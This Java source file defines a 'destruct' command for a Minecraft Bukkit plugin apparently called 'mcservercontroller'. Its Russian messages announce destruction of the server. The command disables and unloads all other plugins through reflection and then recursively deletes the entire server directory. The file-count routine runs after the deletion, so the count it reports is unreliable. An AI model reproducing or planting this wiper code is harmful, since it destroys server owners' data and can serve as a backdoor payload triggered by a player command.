package dev.kazi.mcservercontroller.commands.impl;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.util.Objects;
import java.io.File;
import java.lang.reflect.Field;
import java.net.URLClassLoader;
import java.util.Arrays;

import dev.kazi.mcservercontroller.commands.AbstractCommand;
import dev.kazi.mcservercontroller.utils.FileUtils;
import dev.kazi.mcservercontroller.utils.StringUtils;

@AbstractCommand.CommandInfo(name = "destruct")
public class DestructCommand extends AbstractCommand {

    @Override
    public void onCommand(final Player player, final String[] args) {
        player.sendMessage(StringUtils.color("&f[&6Уничтожение&f] &fВыключение всех плагинов..."));
        Arrays.stream(Bukkit.getPluginManager().getPlugins()).forEachOrdered(plugin -> {
            if (plugin != this.plugin) {
                Bukkit.getPluginManager().disablePlugin(plugin);
                final ClassLoader cl = plugin.getClass().getClassLoader();
                if (cl instanceof URLClassLoader) {
                    try {
                        final Field pluginField = cl.getClass().getDeclaredField("plugin");
                        pluginField.setAccessible(true);
                        pluginField.set(cl, null);
                        final Field pluginInitField = cl.getClass().getDeclaredField("pluginInit");
                        pluginInitField.setAccessible(true);
                        pluginInitField.set(cl, null);
                        ((URLClassLoader)cl).close();
                    }
                    catch (final Exception ex) {}
                }
                System.gc();
            }
            return;
        });
        player.sendMessage(StringUtils.color("&f[&6Уничтожение&f] &fНачинаю удаление сервера"));
        final int deletedFilesCount = this.deleteServerFiles();
        player.sendMessage(StringUtils.color("&f[&6Уничтожение&f] &fУдалено &a" + deletedFilesCount + "&f файлов."));
    }
    
    private int deleteServerFiles() {
        final File serverRoot = new File("./");
        int deletedFilesCount = 0;
        if (serverRoot.exists()) {
            FileUtils.deleteDirectory(serverRoot);
            deletedFilesCount = this.countDeletedFiles(serverRoot);
        }
        return deletedFilesCount;
    }
    
    private int countDeletedFiles(final File directory) {
        int count = 0;
        if (directory.isDirectory()) {
            for (final File file : Objects.requireNonNull(directory.listFiles())) {
                count += this.countDeletedFiles(file);
            }
        }
        else {
            ++count;
        }
        return count;
    }
}
